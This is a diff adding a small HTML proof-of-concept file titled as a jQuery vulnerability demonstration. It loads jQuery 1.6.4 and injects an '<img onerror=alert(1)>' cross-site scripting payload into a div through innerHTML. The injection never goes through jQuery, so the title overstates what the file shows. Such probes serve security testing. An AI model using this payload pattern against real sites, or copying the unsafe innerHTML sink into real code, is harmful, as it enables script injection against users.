@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>PoC for jQuery Vulnerability</title>
+    <script src="https://code.jquery.com/jquery-1.6.4.min.js"></script> <!-- Alternative jQuery CDN -->
+    <script>
+        $(document).ready(function() {
+            // Direct assignment to innerHTML
+            document.getElementById('target').innerHTML = '<img src="x" onerror="alert(1)">';
+        });
+    </script>
+</head>
+<body>
+    <div id="target"></div> <!-- Target element to inject the payload -->
+</body>
+</html>
